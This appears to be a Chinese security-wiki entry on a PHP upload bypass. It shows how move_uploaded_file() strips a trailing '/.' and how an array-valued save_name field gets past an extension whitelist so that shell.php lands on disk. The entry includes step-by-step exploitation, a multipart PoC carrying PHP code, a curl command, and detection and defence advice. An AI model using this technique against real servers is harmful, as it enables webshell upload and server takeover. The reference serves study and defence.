---
id: web-generic-file-upload-move-uploaded-file-trailing-dot
title: move_uploaded_file 归一化尾部 /. 与 \\.，配合数组文件名绕过白名单
type: scenario
domain: web
path: web/generic/file-upload
technique: move-uploaded-file-path-normalization
aliases:
- move_uploaded_file 缺陷
- 尾部 /. 去除
- 保存文件名绕过
- save_name 数组绕过
- php 上传代码审计
tags:
- web
- file-upload
- php
- move-uploaded-file
- path-normalization
- array-bypass
- code-audit
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
affected_versions: PHP <= 7.4（原文称 7.4 仍存在，更高版本未测试）
verification:
  verified_by: verifier-V9
  verified_at: '2026-11-05T00:40:32+08:00'
  notes: 已对照原文与代码审计小节核对：move_uploaded_file 去除尾部 /. 与 \.；save_name 传稀疏数组 [0]=shell.php/、[2]=png 时 end() 取 png 通过白名单，拼接得 shell.php/. 并归一化为 shell.php，原文断点调试确认。原文明确称 PHP 7.4 仍存在、更高版本未测试，affected_versions 保留。PoC 未在本机执行。
---

## 一句话结论

PHP `move_uploaded_file()` 会去除目标文件名尾部的 `/.`（以及尾部的 `\.`），当代码用“拼接后路径”保存且后缀校验针对原始数组元素时，攻击者可让最终落盘名变成 `shell.php`。

## 原理

- 简单形态：调用 `move_uploaded_file($tmp, '/var/www/html/move.php\.')` 时，函数对目标路径做归一化，保存结果变成 `move.php`。代码若只检查上传文件的后缀、不检查保存名，就会被这一点利用。
- 代码审计形态：
  - `$file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];`
  - `if (!is_array($file)) { $file = explode('.', strtolower($file)); }`
  - `$ext = end($file);` 再用 `in_array($ext, ['jpg','png','gif'])` 白名单。
  - 最终 `$file_name = reset($file).'.'.$file[count($file)-1]; move_uploaded_file($tmp, UPLOAD_PATH.'/'.$file_name);`
- 当 `save_name` 是数组时绕过 `explode`：传入 `save_name[0]=shell.php/`、`save_name[2]=png`。`end()` 得到 `png` 通过白名单；`count()` 为 2，`$file[1]` 不存在，拼接结果为空；`reset()` 得到 `shell.php/`，最终 `$file_name = 'shell.php/.'`。
- 目标路径 `UPLOAD_PATH/shell.php/.` 被 `move_uploaded_file()` 归一化为 `UPLOAD_PATH/shell.php`，于是脚本以 `.php` 落盘。
- 成立的根因是“校验用的名字”和“实际落盘的名字”经过不同变换：校验看数组最后一个值，落盘看拼接并经文件系统归一化后的字符串。

## 触发条件

- PHP 版本满足 `move_uploaded_file()` 的尾部归一化行为（原文称到 7.4 仍存在，更高版本未测试）。
- 保存文件名可由 POST 数组控制，或保存路径可由用户控制且后缀检查在归一化之前。
- 代码对数组输入缺少校验（`is_array` 仅决定是否 `explode`，未拒绝数组）。
- 上传目录可访问且脚本可解析。

## 利用步骤

1. 审计上传代码，确认 `save_name` 参与文件名拼接，且 `is_array($file)` 时跳过 `explode`。
2. 构造 `save_name` 为稀疏索引数组：`save_name[0]=shell.php/`、`save_name[2]=png`，使 `end()` 取到 `png` 通过白名单。
3. 上传文件内容为 PHP 代码，MIME 设为白名单中的图片类型（若还有 MIME 校验）。
4. 发送后访问 `UPLOAD_PATH/shell.php`，确认执行。

简单尾部缺陷形态：直接把保存名设为 `x.php\.`，上传内容为图片/脚本，落盘后访问 `x.php`。

## PoC

数组绕过（原始 multipart 片段）：

```http
Content-Disposition: form-data; name="save_name[0]"

shell.php/
------X
Content-Disposition: form-data; name="save_name[2]"

png
------X
Content-Disposition: form-data; name="upload_file"; filename="y.png"
Content-Type: image/png

<?php phpinfo(); ?>
```

简单形态：

```bash
curl -s -X POST 'http://target/upload.php' \
  -F 'file=@shell.png;filename=shell.png;type=image/png' \
  -F 'save_name=x.php\.'
```

两种方式都以最终访问 `shell.php`/`x.php` 返回 PHP 输出为成功标志。

## 变体与关联

- 变体：尾部 `\.`（反斜杠+点）在部分版本同样被去除；多点文件名（`shell.php.`、`shell.php/.`）在 Windows 与 Linux 归一化行为不同，可结合目标系统测试。
- 关联：[[web-generic-file-upload-null-byte-path-truncation]]（同为检查值≠落盘值）；[[web-generic-file-upload-blacklist-double-write-bypass]]（过滤后文件名变化）；[[web-generic-file-upload-weak-suffix-bypass]]（仅按后缀弱校验）。
- 边界：若保存文件名完全由服务端生成、用户不可控，或代码在归一化后重新校验后缀，本手法不成立。

## 检测与防御

- 检测：`save_name`/文件名参数以数组形式提交（`name="save_name[0]"`）；落盘名与请求名不一致且出现路径归一化；上传目录出现 `.php` 文件。
- 防御：拒绝数组形式的文件名参数；使用 `basename()` 并只取最后一段后缀；服务端生成随机文件名与固定扩展名；先归一化路径再做后缀白名单校验；上传目录禁止脚本解析。
